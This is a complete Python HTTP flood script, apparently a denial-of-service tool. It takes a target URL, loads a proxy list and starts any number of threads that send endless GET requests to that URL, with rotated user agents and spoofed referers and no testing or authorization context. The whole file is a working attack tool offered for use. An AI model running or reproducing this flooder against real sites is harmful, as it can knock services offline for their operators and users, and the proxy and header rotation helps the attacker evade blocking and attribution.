import threading
import requests
import random
import time

def load_list_from_file(filename):
    with open(filename, "r") as f:
        return [line.strip() for line in f.readlines() if line.strip()]

# =======================
# 🖥️ User Input Section
# =======================
target_url = input("Enter the target URL (e.g., http://example.com): ").strip()
proxy_file = input("Enter path to proxy list file (e.g., proxies.txt) or leave blank for no proxies: ").strip()
num_threads = int(input("Number of threads (e.g., 100): "))
timeout = int(input("Request timeout in seconds (e.g., 5): "))

# If user input is provided for proxy, load it, else leave it empty
proxies_list = []
if proxy_file:
    proxies_list = load_list_from_file(proxy_file)

# =======================
# 🔗 Realistic Headers
# =======================
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F)",
]

referers = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.facebook.com/",
    "https://twitter.com/",
    "https://duckduckgo.com/"
]

def flood():
    while True:
        headers = {
            "User-Agent": random.choice(user_agents),
            "Referer": random.choice(referers),
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive"
        }

        # =======================
        # Proxy support (conditional)
        # =======================
        if proxies_list:
            proxy = random.choice(proxies_list)
            proxy_dict = {"http": proxy, "https": proxy}
            try:
                response = requests.get(target_url, headers=headers, proxies=proxy_dict, timeout=timeout)
                print(f"[+] {proxy} => {response.status_code}")
            except Exception as e:
                print(f"[-] {proxy} failed: {e}")
        else:
            try:
                response = requests.get(target_url, headers=headers, timeout=timeout)
                print(f"[+] Direct request => {response.status_code}")
            except Exception as e:
                print(f"[-] Request failed: {e}")

# =======================
# 🚀 Launching Threads
# =======================
print(f"[*] Starting {num_threads} threads targeting {target_url}")
threads = []

for _ in range(num_threads):
    t = threading.Thread(target=flood)
    t.daemon = True
    t.start()
    threads.append(t)

for t in threads:
    t.join()
